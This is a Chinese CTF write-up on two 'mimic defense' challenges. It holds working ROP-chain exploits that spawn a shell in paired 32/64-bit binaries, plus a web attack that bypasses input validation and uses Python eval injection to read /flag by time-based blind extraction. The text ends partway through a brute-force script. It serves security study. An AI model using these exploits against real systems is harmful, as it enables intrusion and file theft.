<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="952b4bd1cb513f326b8d03b71007d667">前言</h2>
<p>拟态防御是什么，网上一搜就知道，在此不作详述了。想起一次见到拟态防御是在17年的工信部竞赛，当时知道肯定攻不破，连题目都没去打开。近期终于见到一些CTF比赛中出现拟态型的题目，题目不算太难，不过这种题型比较少见，特此记录一下。</p>
<h2 data-content="1" id="a0af34c07d79fd9d9718ec57b3a3507d">pwn（强网杯 babymimic）</h2>
<p>打开压缩包，发现竟然有两个二级制文件，先检查一下保护</p>
<pre><code>[*] '/home/kira/pwn/qwb/_stkof'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/home/kira/pwn/qwb/__stkof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)</code></pre>
<p>两个二进制文件，一个是32位，一个是64位，均为静态编译，漏洞也很明显，是一个简单粗暴的栈溢出。</p>
<p>伪代码如下：</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">vul</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// 32位[esp+Ch] [ebp-10Ch]  64位[rsp+0h] [rbp-110h]</span>

  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">j_memset_ifunc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>因为这是一题拟态的pwn题，跟传统题型相比，加入了拟态的检查机制，大概原理是：题目会同时启动32位程序和64位程序，而我们的输入会分别传入这个两个进程，每个程序一份，然后题目会检测两个程序的输出，若两个程序的输出不一致或任一程序或者异常退出，则会被判断为<code>check down</code>，直接断开链接。只有两个程序的输入一致时，才能通过检查。因此，我们要做的就是构造一个payload，输入到32位程序和64位程序的时候，确保输出流完全一致，也就是用一个payload在32位程序和64位程序都能getshell。</p>
<p>如果不是拟态机制，这道题直接用<code>ROPgadget</code>生成ropchain就可以getshell，分分钟就被秒了。</p>
<pre><code>#!/usr/bin/env python2
        # execve generated by ROPgadget

        from struct import pack

        # Padding goes here
        p = ''

        p += pack('&lt;I', 0x0806e9cb) # pop edx ; ret
        p += pack('&lt;I', 0x080d9060) # @ .data
        p += pack('&lt;I', 0x080a8af6) # pop eax ; ret
        p += '/bin'
        p += pack('&lt;I', 0x08056a85) # mov dword ptr [edx], eax ; ret
        p += pack('&lt;I', 0x0806e9cb) # pop edx ; ret
        p += pack('&lt;I', 0x080d9064) # @ .data + 4
        p += pack('&lt;I', 0x080a8af6) # pop eax ; ret
        p += '//sh'
        p += pack('&lt;I', 0x08056a85) # mov dword ptr [edx], eax ; ret
        p += pack('&lt;I', 0x0806e9cb) # pop edx ; ret
        p += pack('&lt;I', 0x080d9068) # @ .data + 8
        p += pack('&lt;I', 0x08056040) # xor eax, eax ; ret
        p += pack('&lt;I', 0x08056a85) # mov dword ptr [edx], eax ; ret
        p += pack('&lt;I', 0x080481c9) # pop ebx ; ret
        p += pack('&lt;I', 0x080d9060) # @ .data
        p += pack('&lt;I', 0x0806e9f2) # pop ecx ; pop ebx ; ret
        p += pack('&lt;I', 0x080d9068) # @ .data + 8
        p += pack('&lt;I', 0x080d9060) # padding without overwrite ebx
        p += pack('&lt;I', 0x0806e9cb) # pop edx ; ret
        p += pack('&lt;I', 0x080d9068) # @ .data + 8
        p += pack('&lt;I', 0x08056040) # xor eax, eax ; ret
        p += pack('&lt;I', 0x0807be5a) # inc eax ; ret
        p += pack('&lt;I', 0x0807be5a) # inc eax ; ret
        p += pack('&lt;I', 0x0807be5a) # inc eax ; ret
        p += pack('&lt;I', 0x0807be5a) # inc eax ; ret
        p += pack('&lt;I', 0x0807be5a) # inc eax ; ret
        p += pack('&lt;I', 0x0807be5a) # inc eax ; ret
        p += pack('&lt;I', 0x0807be5a) # inc eax ; ret
        p += pack('&lt;I', 0x0807be5a) # inc eax ; ret
        p += pack('&lt;I', 0x0807be5a) # inc eax ; ret
        p += pack('&lt;I', 0x0807be5a) # inc eax ; ret
        p += pack('&lt;I', 0x0807be5a) # inc eax ; ret
        p += pack('&lt;I', 0x080495a3) # int 0x80</code></pre>
<p>但是，32位和64位的汇编码完全不同，函数调用方式也是不同，要如何构造一条payload同时在32位和64位程序getshell呢。出题人非常友好地留了一个漏洞点给我们，留意到32位程序的溢出长度是<code>0x110</code>，而64位程序的溢出长度是<code>0x118</code>，差了8字节，这就给了我们空间可以构造特殊payload。</p>
<p>思路是：填充完<code>0x110</code>字节后，32位程序会到达ret位置，可以寻找一些控制esp的gadget，跳过后面64位的ret到达ropchain，同理64位也能寻找这种gadget跳过32位的ropchain。使用<code>ROPgadget</code>查找可以控制sp的gadget，类似<code>add sp, 0xc; ret</code>，然后在payload中指定的位置放置ropchain。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190617224700-c3871fc4-910e-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190617224733-d72d98aa-910e-1.png"/></p>
<p>非常幸运，找了两个大小合适的gadget，<code>ROPgadget</code>生成的ropchain注意需要修改一下，不然会导致输入过长，要控制payload的长度在0x300以内。</p>
<p>最后需要注意的是，<code>vul</code>函数结束时会调用<code>puts</code>，为保证输出相同，填充的垃圾数据要用<code>\x00</code>进行截断。</p>
<p>完整exp如下：</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="c1"># 32bit ropchain</span>
<span class="n">rop32</span> <span class="o">=</span> <span class="s1">''</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806e9cb</span><span class="p">)</span> <span class="c1"># pop edx ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080d9060</span><span class="p">)</span> <span class="c1"># @ .data</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080a8af6</span><span class="p">)</span> <span class="c1"># pop eax ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="s1">'/bin'</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08056a85</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806e9cb</span><span class="p">)</span> <span class="c1"># pop edx ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080d9064</span><span class="p">)</span> <span class="c1"># @ .data + 4</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080a8af6</span><span class="p">)</span> <span class="c1"># pop eax ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="s1">'//sh'</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08056a85</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806e9cb</span><span class="p">)</span> <span class="c1"># pop edx ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080d9068</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08056040</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08056a85</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080481c9</span><span class="p">)</span> <span class="c1"># pop ebx ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080d9060</span><span class="p">)</span> <span class="c1"># @ .data</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806e9f2</span><span class="p">)</span> <span class="c1"># pop ecx ; pop ebx ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080d9068</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080d9060</span><span class="p">)</span> <span class="c1"># padding without overwrite ebx</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x0806e9cb</span><span class="p">)</span> <span class="c1"># pop edx ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080d9068</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x08056040</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080a8af6</span><span class="p">)</span> <span class="c1"># pop eax ; ret</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span>
<span class="n">rop32</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;I'</span><span class="p">,</span> <span class="mh">0x080495a3</span><span class="p">)</span> <span class="c1"># int 0x80</span>

<span class="c1"># 64bit ropchain</span>
<span class="n">rop64</span> <span class="o">=</span> <span class="s1">''</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000405895</span><span class="p">)</span> <span class="c1"># pop rsi ; ret</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000006a10e0</span><span class="p">)</span> <span class="c1"># @ .data</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000043b97c</span><span class="p">)</span> <span class="c1"># pop rax ; ret</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="s1">'/bin//sh'</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000046aea1</span><span class="p">)</span> <span class="c1"># mov qword ptr [rsi], rax ; ret</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000405895</span><span class="p">)</span> <span class="c1"># pop rsi ; ret</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000006a10e8</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000436ed0</span><span class="p">)</span> <span class="c1"># xor rax, rax ; ret</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000046aea1</span><span class="p">)</span> <span class="c1"># mov qword ptr [rsi], rax ; ret</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000004005f6</span><span class="p">)</span> <span class="c1"># pop rdi ; ret</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000006a10e0</span><span class="p">)</span> <span class="c1"># @ .data</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000405895</span><span class="p">)</span> <span class="c1"># pop rsi ; ret</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000006a10e8</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000043b9d5</span><span class="p">)</span> <span class="c1"># pop rdx ; ret</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x00000000006a10e8</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000436ed0</span><span class="p">)</span> <span class="c1"># xor rax, rax ; ret</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x000000000043b97c</span><span class="p">)</span> <span class="c1"># pop rax ; ret</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">rop64</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;Q'</span><span class="p">,</span> <span class="mh">0x0000000000461645</span><span class="p">)</span> <span class="c1"># syscall ; ret</span>

<span class="c1"># 32 gadget</span>
<span class="n">add_esp</span> <span class="o">=</span> <span class="mh">0x080a8f69</span> <span class="c1"># add esp, 0xc ; ret</span>

<span class="c1"># 64 gadget</span>
<span class="n">add_rsp</span> <span class="o">=</span> <span class="mh">0x00000000004079d4</span> <span class="c1"># add rsp, 0xd8 ; ret</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">'kira'</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x110</span><span class="p">,</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">add_esp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">add_rsp</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop32</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xd8</span><span class="p">,</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop64</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'try to pwn it?</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h2 data-content="1" id="79a2c39da50a27c0c1df68ea4e2ed7c6">web （RCTF2019 Calcalcalc）</h2>
<p>题目来RCTF2019，是一个拟态的web题。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190617225234-8a60889c-910f-1.png"/></p>
<h3 data-content="1" id="09803b29cdebcc1be63f8b4f824d321d">题目简单分析</h3>
<p>前端是一个next.js的网站，只能输入0-9a-z，加减乘除，空格，括号，同时检查输入长度。<br/>
有3个后端决策器，分别是php、node和python执行表达式，3个决策器会对输入进行运算，只有当3个决策器返回的结果一致时，才会输出结果。</p>
<p>例如输入<code>1+1</code>，可以得到结果<code>{"ret":"2"}</code>。</p>
<p>观察后台的记录，3个决策器均返回了<code>{"ret":"2"}</code></p>
<pre><code>frontend_1        | [Nest] 16   - 06/16/2019, 6:06 AM   [AppController] Expression = "1+1"
frontend_1        | [Nest] 16   - 06/16/2019, 6:06 AM   [AppController] Ret = [{"ret":"2"},{"ret":"2"},{"ret":"2"}]</code></pre>
<p>输入<code>eval(1+1)</code>，可以得到结果<code>That's classified information. - Asahina Mikuru</code>。</p>
<p>观察后台的记录，决策器结果不一致，返回错误信息</p>
<pre><code>frontend_1        | [Nest] 16   - 06/16/2019, 6:05 AM   [AppController] Expression = "eval(1+1)"
frontend_1        | [Nest] 16   - 06/16/2019, 6:05 AM   [AppController] Ret = [{"ret":"2"},"Request failed with status code 500","Request failed with status code 500"]</code></pre>
<h3 data-content="1" id="7c3166a3a5ba61b8fb5f7638cf9572f1">源码分析</h3>
<p>首先分析前端的代码，题目进行计算时往<code>/calculate</code> post表达式，可以在 <strong>app.controller.ts</strong>中看到对应的代码，3个IP为后台决策器</p>
<div class="highlight"><pre><span></span><span class="kd">@Post</span><span class="p">(</span><span class="s1">'/calculate'</span><span class="p">)</span>
  <span class="nx">calculate</span><span class="p">(</span><span class="kd">@Body</span><span class="p">()</span> <span class="nx">calculateModel</span>: <span class="kt">CalculateModel</span><span class="p">,</span> <span class="kd">@Res</span><span class="p">()</span> <span class="nx">res</span>: <span class="kt">Response</span><span class="p">)</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">serializedBson</span> <span class="o">=</span> <span class="nx">bson</span><span class="p">.</span><span class="nx">serialize</span><span class="p">(</span><span class="nx">calculateModel</span><span class="p">);</span>
    <span class="kr">const</span> <span class="nx">urls</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'10.0.20.11'</span><span class="p">,</span> <span class="s1">'10.0.20.12'</span><span class="p">,</span> <span class="s1">'10.0.20.13'</span><span class="p">];</span>
    <span class="nx">bluebird</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">urls</span><span class="p">,</span> <span class="nx">async</span> <span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
</pre></div>
<p>fuzz的时候发现是有过滤的，表达式的输入过滤在<strong>expression.validator.ts</strong>，首先检查了输入长度，然后再检查输入内容，过滤大部分的命令执行需要用到的字符。</p>
<div class="highlight"><pre><span></span><span class="kr">export</span> <span class="kd">function</span> <span class="nx">ExpressionValidator</span><span class="p">(</span><span class="nx">property</span>: <span class="kt">number</span><span class="p">,</span> <span class="nx">validationOptions?</span>: <span class="kt">ValidationOptions</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">return</span> <span class="p">(</span><span class="nx">object</span>: <span class="kt">Object</span><span class="p">,</span> <span class="nx">propertyName</span>: <span class="kt">string</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">registerDecorator</span><span class="p">({</span>
            <span class="nx">name</span><span class="o">:</span> <span class="s1">'ExpressionValidator'</span><span class="p">,</span>
            <span class="nx">target</span>: <span class="kt">object.constructor</span><span class="p">,</span>
            <span class="nx">propertyName</span><span class="p">,</span>
            <span class="nx">constraints</span><span class="o">:</span> <span class="p">[</span><span class="nx">property</span><span class="p">],</span>
            <span class="nx">options</span>: <span class="kt">validationOptions</span><span class="p">,</span>
            <span class="nx">validator</span><span class="o">:</span> <span class="p">{</span>
                <span class="nx">validate</span><span class="p">(</span><span class="nx">value</span>: <span class="kt">any</span><span class="p">,</span> <span class="nx">args</span>: <span class="kt">ValidationArguments</span><span class="p">)</span> <span class="p">{</span>
                  <span class="kr">const</span> <span class="nx">str</span> <span class="o">=</span> <span class="nx">value</span> <span class="o">?</span> <span class="nx">value</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
                  <span class="k">if</span> <span class="p">(</span><span class="nx">str</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
                  <span class="p">}</span>
                  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">args</span><span class="p">.</span><span class="nx">object</span> <span class="kr">as</span> <span class="nx">CalculateModel</span><span class="p">).</span><span class="nx">isVip</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nx">str</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;=</span> <span class="nx">args</span><span class="p">.</span><span class="nx">constraints</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
                      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
                    <span class="p">}</span>
                  <span class="p">}</span>
                  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="sr">/^[0-9a-z\[\]\(\)\+\-\*\/ \t]+$/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">str</span><span class="p">))</span> <span class="p">{</span> 
                    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
                  <span class="p">}</span>
                  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
                <span class="p">},</span>
            <span class="p">},</span>
        <span class="p">});</span>
   <span class="p">};</span>
<span class="p">}</span>
</pre></div>
<p>默认参数在<strong>calculate.model.ts</strong>，默认输入最大长度为15，<code>isVip</code>默认是<code>false</code></p>
<div class="highlight"><pre><span></span><span class="kr">export</span> <span class="k">default</span> <span class="kr">class</span> <span class="nx">CalculateModel</span> <span class="p">{</span>

  <span class="kd">@IsNotEmpty</span><span class="p">()</span>
  <span class="kd">@ExpressionValidator</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="p">{</span>
    <span class="nx">message</span><span class="o">:</span> <span class="s1">'Invalid input'</span><span class="p">,</span>
  <span class="p">})</span>
  <span class="kr">public</span> <span class="nx">readonly</span> <span class="nx">expression</span>: <span class="kt">string</span><span class="p">;</span>

  <span class="kd">@IsBoolean</span><span class="p">()</span>
  <span class="kr">public</span> <span class="nx">readonly</span> <span class="nx">isVip</span>: <span class="kt">boolean</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>那么长度限制可以通过，修改发送数据的类型进行绕过。提交json参数，修改<code>isVip</code>为<code>true</code>，Content-Type修改为<code>application/json</code>，这样可以跳过长度判断的语句。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190617225821-597c8c0c-9110-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190705142518-a891588c-9eed-1.png"/></p>
<p>flag在根目录，下一步需要考虑的是如何进行命令注入，由于nodejs不太熟悉，先看一下php和python。</p>
<p>php的决策器主函数<strong>index.php</strong></p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">ob_start</span><span class="p">();</span>
<span class="nv">$input</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'php://input'</span><span class="p">);</span>
<span class="nv">$options</span> <span class="o">=</span> <span class="nx">MongoDB\BSON\toPHP</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
<span class="nv">$ret</span> <span class="o">=</span> <span class="k">eval</span><span class="p">(</span><span class="s1">'return '</span> <span class="o">.</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$options</span><span class="o">-&gt;</span><span class="na">expression</span> <span class="o">.</span> <span class="s1">';'</span><span class="p">);</span>
<span class="k">echo</span> <span class="nx">MongoDB\BSON\fromPHP</span><span class="p">([</span><span class="s1">'ret'</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$ret</span><span class="p">]);</span>
</pre></div>
<p><strong>linit.ini</strong>中限制了大量执行命令的函数，暂时想不到绕过的姿势</p>
<div class="highlight"><pre><span></span><span class="x">disable_functions = set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log</span>
<span class="x">max_execution_time = 1</span>
</pre></div>
<p>再看一下python的决策器主函数<strong>app.py</strong>，也是使用<code>eval</code>进行计算</p>
<div class="highlight"><pre><span></span><span class="nd">@app.route</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">calculate</span><span class="p">():</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_data</span><span class="p">()</span>
    <span class="n">expr</span> <span class="o">=</span> <span class="n">bson</span><span class="o">.</span><span class="n">BSON</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">bson</span><span class="o">.</span><span class="n">BSON</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span>
      <span class="s2">"ret"</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">expr</span><span class="p">[</span><span class="s1">'expression'</span><span class="p">])))</span>
    <span class="p">})</span>
</pre></div>
<p>python可以用<code>+</code>进行字符串拼接，字符过滤可以用ascii编码绕过，绕过方法如下：</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="nb">eval</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x2b</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x31</span><span class="p">))</span> <span class="c1"># 1+1</span>
<span class="mi">2</span>
</pre></div>
<p>由于python的代码在php和nodejs中都是无法运行的，决策器的验证是不可能通过，因此不会有正常结果回显。虽然不会显示命令注入的回显，但是返回结果会等所有决策器返回运行结果后才发送响应包，因此可以使用时间盲注，逐字符进行爆破flag。</p>
<p>注入payload：<code>__import__("time").sleep(2) if open("/flag").read()[0]=='f' else 1</code></p>
<p>决策器的返回结果，其中python决策器是第二个，从返回结果可以看到，可以使用布尔注入。</p>
<pre><code>[Nest] 16   - 06/16/2019, 7:11 AM   [AppController] Ret = [{"ret":"timeout"},{"ret":"1"},"Request failed with status code 500"]    # False
[Nest] 16   - 06/16/2019, 7:11 AM   [AppController] Ret = [{"ret":"timeout"},{"ret":"None"},"Request failed with status code 500"] # True</code></pre>
<p>简单编写暴力爆破exp，提高效率也可以使用二分法爆破。</p>
<div class="highlight"><pre><span></span><span class="c1"># -*- coding:utf-8 -*-</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">string</span>

<span class="n">header</span> <span class="o">=</span> <span class="p">{</span>
<span class="s2">"Content-Type"</span><span class="p">:</span><span class="s2">"application/json"</span><span class="p">}</span>
<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://x.x.x.x:50004/calculate"</span>

<span class="k">def</span> <span class="nf">foo</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
